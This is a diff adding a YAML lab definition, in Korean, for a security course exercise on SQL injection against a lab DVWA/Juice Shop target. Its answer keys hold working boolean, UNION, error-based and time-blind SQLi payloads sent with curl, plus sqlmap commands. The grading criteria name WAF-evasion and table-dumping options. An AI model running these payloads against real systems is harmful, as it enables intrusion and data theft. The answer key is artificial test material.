@@ -1,0 +1,79 @@
+lab_id: standalone-attack-week04
+title: SQL Injection (sqlmap + DVWA)
+version: standalone-non-ai
+course: attack
+week: 4
+description: |
+  4 SQLi 타입 (boolean / error / union / blind) + sqlmap 자동화 + DVWA 수준별
+  + ModSec 차단 분석.
+difficulty: medium
+duration_minutes: 150
+prerequisites: [W03]
+objectives:
+  - 4 SQLi 타입 페이로드
+  - sqlmap 자동화
+  - ModSec 차단 비율 분석
+pass_threshold: 0.7
+steps:
+  - order: 1
+    instruction: 4 SQLi 타입 페이로드 + 응답 코드
+    hint: |
+      curl "http://10.20.30.1/?q=1' OR '1'='1"
+    category: exploit
+    points: 25
+    answer: |
+      ssh 6v6-attacker '
+      echo "=== boolean ==="
+      curl -s -o /dev/null -w "%{http_code}\n" -H "Host: juice.6v6.lab" "http://10.20.30.1/?q=1+OR+1=1"
+      echo "=== union ==="
+      curl -s -o /dev/null -w "%{http_code}\n" -H "Host: juice.6v6.lab" "http://10.20.30.1/?q=1+UNION+SELECT+1,2,3--"
+      echo "=== error ==="
+      curl -s -o /dev/null -w "%{http_code}\n" -H "Host: juice.6v6.lab" "http://10.20.30.1/?q=1+AND+extractvalue(1,1)--"
+      echo "=== blind time ==="
+      time curl -s -o /dev/null -w "%{http_code}\n" -H "Host: juice.6v6.lab" "http://10.20.30.1/?q=1+AND+SLEEP(3)"
+      '
+    answer_detail: 4 타입 + 응답 코드
+    verify:
+      type: output_contains
+      expect: '4'
+      field: stdout
+      semantic:
+        intent: 4 SQLi 타입
+        success_criteria: [4 타입 시도]
+        acceptable_methods:
+          - "**[OSS] boolean tautology (OR 1=1)**"
+          - "**[OSS] UNION SELECT NULL,NULL,...**"
+          - "**[OSS] error-based extractvalue/updatexml**"
+          - "**[OSS] blind time SLEEP(N)**"
+          - "**[OSS] blind boolean AND IF(...)**"
+          - "**[OSS] ModSec 942100 차단**"
+          - "**[OSS] paranoia 1 우회 가능 패턴**"
+          - "**[OSS] OWASP A03 + ATT&CK T1190**"
+    target_vm: attacker
+
+  - order: 2
+    instruction: sqlmap 자동화 + ModSec 차단 통계
+    hint: sqlmap -u "..." --batch
+    category: exploit
+    points: 25
+    answer: |
+      ssh 6v6-attacker 'timeout 60 sqlmap -u "http://10.20.30.1/?q=1" --batch --headers="Host: juice.6v6.lab" 2>&1 | tail -20 | head -10' || ssh 6v6-attacker 'echo sqlmap timed out'
+      ssh 6v6-web 'sudo tail -10 /var/log/apache2/modsec_audit.log | jq -r ".transaction.response.http_code" | sort | uniq -c'
+    answer_detail: sqlmap 결과 + ModSec 응답 분포
+    verify:
+      type: output_contains
+      expect: sqlmap
+      field: stdout
+      semantic:
+        intent: sqlmap + ModSec
+        success_criteria: [sqlmap 실행]
+        acceptable_methods:
+          - "**[OSS] sqlmap --batch (질문 자동 yes)**"
+          - "**[OSS] --headers=Host: + --random-agent**"
+          - "**[OSS] --proxy=http://burp:8080**"
+          - "**[OSS] --dbs / --tables / --dump**"
+          - "**[OSS] --tamper=space2comment**"
+          - "**[OSS] ModSec 942 차단 비율**"
+          - "**[OSS] sqlmap 의 sleep-based blind detect**"
+          - "**[OSS] 우회 — paranoia 1 vs 2 차이**"
+    target_vm: attacker
